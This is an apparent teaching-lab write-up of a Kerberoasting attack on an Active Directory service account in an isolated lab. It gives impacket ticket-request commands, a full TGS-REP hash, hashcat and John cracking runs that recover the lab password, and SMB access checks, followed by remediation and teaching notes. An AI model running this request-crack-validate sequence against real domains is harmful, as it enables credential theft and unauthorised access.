# Kerberoasting: svc-web Service Account

## Summary

`svc-web` (the "Web Service" account, `OU=Service Accounts,OU=UOW-CSF`, member of `Web-Services`) carries a registered Service Principal Name, making it Kerberoastable. Its password satisfies Active Directory's default complexity policy but is a predictable, organisation-themed value, cracked from an offline TGS-REP hash in under a second with a 152-line targeted wordlist. The recovered credential was independently validated by requesting a fresh TGT and by authenticating an SMB session.

## Environment

| Item | Value |
|---|---|
| Target | `uow-csf-dc.uow-csf.internal`, `192.168.144.200` |
| Domain | `uow-csf.internal` |
| Target account | `svc-web` (SPN: `HTTP/uow-intranet.uow-csf.internal`) |
| Attacker | Kali VM on the same host-only lab network |
| Tools | `impacket-GetUserSPNs`, `impacket-getTGT`, `hashcat` (PoCL CPU backend), `john`, `smbclient` |
| Wordlist | `/usr/share/wordlists/cav-csf-wordlist.txt`, see `wordlists-README.md` |

## Lab Dependencies

- Prerequisite: `r-19` (Windows/AD enumeration), which established the domain name, DC hostname, and a working domain credential, `analyst` / `CavLab2026!`. Requesting a service ticket for another account's SPN requires the requester to already hold a valid TGT.
- Starting access: authenticated domain user (`analyst`).
- Resulting access: a second, independent domain credential (`svc-web` / `Webservice2026!`), confirmed valid via a fresh Kerberos TGT and an authenticated SMB session.
- Feeds into: nothing built yet. `svc-web`'s `Web-Services` group membership is the same naming this account was chosen to anticipate a future Windows intranet site's service account (`w-01` Section 5); no further chain exists until that site is built.
- Suggested teaching level: Level 6–7.

## Misconfiguration

`svc-web` has a Service Principal Name registered (`HTTP/uow-intranet.uow-csf.internal`), which is what makes it Kerberoastable at all, any authenticated domain user can request a service ticket for it without needing its password first. The account's password is complexity-compliant by AD's default policy (upper, lower, digit, symbol, 15 characters) but is a predictable, structured value rather than a genuinely strong one, no CVE, a realistic case of a service account passing password policy while remaining weak in practice.

## Exploitation

### Requesting the service ticket

```bash
impacket-GetUserSPNs uow-csf.internal/analyst -dc-ip 192.168.144.200 -request -outputfile svc-web.kirbi
```

```text
ServicePrincipalName                Name     MemberOf                                                     PasswordLastSet             LastLogon  Delegation
----------------------------------  -------  -----------------------------------------------------------  --------------------------  ---------  ----------
HTTP/uow-intranet.uow-csf.internal  svc-web  CN=Web-Services,OU=Groups,OU=UOW-CSF,DC=uow-csf,DC=internal  2026-08-31 04:19:12.403216  <never>
[-] CCache file is not found. Skipping...
```

(The `CCache file is not found` line is impacket checking for an unrelated `KRB5CCNAME` ticket cache environment variable, not an error about this request.)

```bash
cat svc-web.kirbi
```

```text
$krb5tgs$23$*svc-web$UOW-CSF.INTERNAL$uow-csf.internal/svc-web*$67a971d0aefa9c9d34fa6b39f404f7e9$8ab4c46c127bc6232f09d37fa2240a523c734e8f09bc4a3736f15f9e7018b339e5dddb07543780a47098d57fddec08ef684c4c0a7adc1023524d7aa66f039fd96fbf2691fa92204d5e19aea7806a654a7d900caba81de21e9af77133160b2d2076f6f5b7e7441966c58a0c030be6b5f4a74613f10b11f773c2fac620a8bfe7fab0fb4050522760b610b541f94cf079130c09f8f3714de794e0df443080ba87f53c973e76c3d7f396df04c1bdd49a478978ca7dd451cd49a3ae78081561448a60bb5b492d42884eb96e891ed939c6f2e71a0a84ae2a6811f7927638284499041097b983882b6bb39cca638278c217be7a9d5efd8dd928f93f84c1725f1f7dc609df33abf1d4351ee9ec45394fadcb33f3b12a555ce083b70da55cd65bd5f9cb6a4c2b8261e64d770c670a69754df6f12482556fd1eddab3c8530ecf57edb34d51ba43ffe77d1cff7df07623ab53db995ec407ae3cbd53fba0550a800e84f67e6da233800964a990b48ed8264256be187e7703a42369c21b05ce325bf1ae481e5fcb08fb328de72bdb9bd33499d9d6bc030ba15d9c0da2af0480fb06171713e9dbf3878abe3abac4865f808bcaa9812e8cd67c520c3c5e3160b524106f2313fb8779a59bebb80d74b338a58e6002e66d15d1f58c4d375b73b518269a218fbba3f2f775580b6f595bf8a9efd9213bd7ec1f162a619612ec3007229c28cb43f9db059502b2b65a9712446e94a7faa6005debbc4e1383f92f95e9b4eb95c53e09890352eb8d52f441e2e569fcf860ff26a5e42828cc75cd6cc35bbdb7196d7d3d2f054e12ce8201274148fbe184dc9e687f4c5bf49e2e8c6d31c2b91b1757acd0bc31216f5f37713bf7074d48cb2b20266ab3c9837224681c0c3c1ef9dea70db2041b1c51f127e31b7a6d2a14d904f007289b094575536970bb37905cd2a3f320a69dc29520460e808a06b099709126c6769d8cb42bfa3f341fcfb92d3c5476fb0bc772b0291e28e15b4bdf3fc7c0023e82ac87da6c26509f78779460d529ae05df8870a7f503d393db1e4d0161f12e8cc0071b4541512899d3b32bbf93ed732375719c040bacad2b2e799703932e9897caca11825c74db8a2454e492c00b6263f98aeebdeb1ab3fefe5bc39e882c4985255d6e353783a356b2c92ccd895634c65305d251c762ca155a203bd79a0ec3cc091aec1bfef18ddd9761871572f5ac2e119927142e85532abb0b72bbd7e13d088afb26a2aced2c0b37b4b46113b2c8e69a917f81321e73134b64c41a8ddfe47e4953257c1f9e01a9f850f70024eaef524c132882d1077604fa7d2068a20a5bad16951f63713625c5b2cf97569824d55a9f93c435224ecb4799b104e9af2567ca3280aaed7cba0393ddbe509211784aeb72ebdc79390c08cd8fc1a083efa42f9ab37161ddb34a4cf317adc9ed0a1c44bbb08fe694517a06d72b35ff04c410f1379114bc36127b7835504d815fc084db332ac5
```

RC4 (etype 23), consistent with `svc-web` supporting legacy encryption types rather than being restricted to AES.

### Cracking: hashcat

```bash
hashcat -m 13100 svc-web.kirbi /usr/share/wordlists/cav-csf-wordlist.txt
```

```text
* Device #01: cpu-sandybridge-Intel(R) Core(TM) i9-10920X CPU @ 3.50GHz, 734/1469 MB (734 MB allocatable), 4MCU
...
Dictionary cache built:
* Filename..: /usr/share/wordlists/cav-csf-wordlist.txt
* Passwords.: 152
* Bytes.....: 1732
* Keyspace..: 152
* Runtime...: 0 secs
The wordlist or mask that you are using is too small.
...
$krb5tgs$23$*svc-web$UOW-CSF.INTERNAL$uow-csf.inter...332ac5:Webservice2026!
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Speed.#01........:     4170 H/s (0.15ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 152/152 (100.00%)
Started: Mon Aug 31 04:19:41 2026
Stopped: Mon Aug 31 04:19:45 2026
```

### Cracking: John the Ripper (independent cross-check)

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/cav-csf-wordlist.txt svc-web.kirbi
john --show --format=krb5tgs svc-web.kirbi
```

```text
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Webservice2026!  (?)
1g 0:00:00:00 DONE (2026-08-31 04:20) 100.0g/s 15200p/s 15200c/s 15200C/s cavcsf..Web#1
Session completed.
```

```text
?:Webservice2026!
1 password hash cracked, 0 left
```

Both tools, run independently against the same hash, agree: `Webservice2026!`. Consistent with this project's standing rule of not treating a single tool's output as ground truth.

## Credential Discovery / Cracking Wordlist

`/usr/share/wordlists/cav-csf-wordlist.txt`, 152 lines at the time of this crack (see `wordlists-README.md`), used specifically because `svc-web`'s SPN and group name already suggest a CAV-CSF-themed convention, not a generic breach corpus. `Webservice2026!` is exactly the mechanically generated capitalised-root-plus-year-plus-symbol entry the list's design rationale describes.

## Validating the Recovered Credential

```bash
impacket-getTGT uow-csf.internal/svc-web:'Webservice2026!' -dc-ip 192.168.144.200
```

```text
[*] Saving ticket in svc-web.ccache
```

A freshly issued TGT from the KDC is definitive proof the password is correct, independent of the offline crack.

## Resulting Access

```bash
smbclient -L //192.168.144.200/ -U 'UOWCSF\svc-web%Webservice2026!'
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
```

Share-name enumeration alone does not confirm access to any share's contents, so a specific share was connected to directly:

```bash
smbclient //192.168.144.200/SYSVOL -U 'UOWCSF\svc-web%Webservice2026!' -c 'ls'
```

```text
  .                                   D        0  Thu Aug 27 06:21:58 2026
  ..                                  D        0  Thu Aug 27 06:21:58 2026
  uow-csf.internal                   Dr        0  Thu Aug 27 06:21:58 2026
                15570943 blocks of size 4096. 12621684 blocks available
```

`svc-web`'s credentials authenticate over SMB, enumerate the standard administrative share names, and read the contents of `SYSVOL`, listing the domain's Group Policy directory (`uow-csf.internal`). `SYSVOL` is readable by any authenticated domain user by default, not a privilege specific to `svc-web` or `Web-Services`, `ADMIN$`/`C$` were not connected to and remain untested. The genuine outcome is a second, independently usable domain credential with ordinary authenticated-user read access, not administrative access to the DC.

## Outcome

Kerberoasting recovered a second domain credential, `svc-web` / `Webservice2026!`, from an SPN-carrying account whose password passes AD complexity but not real strength, and confirmed it grants ordinary authenticated-user access (SMB logon, `SYSVOL` read). This is domain **credential exposure**, not local privilege escalation and not domain compromise, `svc-web` holds no elevated rights, and no further chain exists from it in the current build.

## Remediation

- Do not register SPNs on accounts unless a genuine service requires them.
- Where an SPN is required, use a long, random password (25+ characters) or a Group Managed Service Account (gMSA), which rotates its own password automatically and is not practically crackable.
- Restrict Kerberos encryption types to AES only (disable RC4/etype 23 support) to substantially raise offline cracking cost even against a weak password.
- Monitor for anomalous volumes of RC4 TGS-REQ traffic, a standard Kerberoasting detection signal.

## Teaching Notes

- This is a deliberate contrast with the project's no-CVE misconfiguration findings (Samba, SNMP, Redis, DNS, SMTP): the vulnerability here is a legitimate AD feature (SPNs) combined with a policy-compliant-but-weak password, not a bug or an open service.
- Cross-tool verification (hashcat and John agreeing independently) follows this project's standing rule that a single tool's output is a claim, not a verdict.
- `Webservice2026!` cracking instantly is the direct, intended consequence of `cav-csf-wordlist.txt`'s design (`wordlists-README.md`), not a coincidence, the account's SPN and group name are themselves the OSINT signal the wordlist's roots were built from.
- Share-name enumeration and actual content access are distinct claims, this write-up demonstrates both separately rather than inferring the second from the first: `smbclient -L` only proves the credential is valid and can see share names, `smbclient //.../SYSVOL -c 'ls'` proves it can actually read a share's contents.
- `svc-web`'s Phase 2 password (`Webservice2026!`) is deliberately distinct from the Phase 1 shared baseline convention (`CavLab2026!`), which remains in use only on `analyst` as the low-privilege bootstrap account this activity's TGS request authenticates with, not on the account being attacked.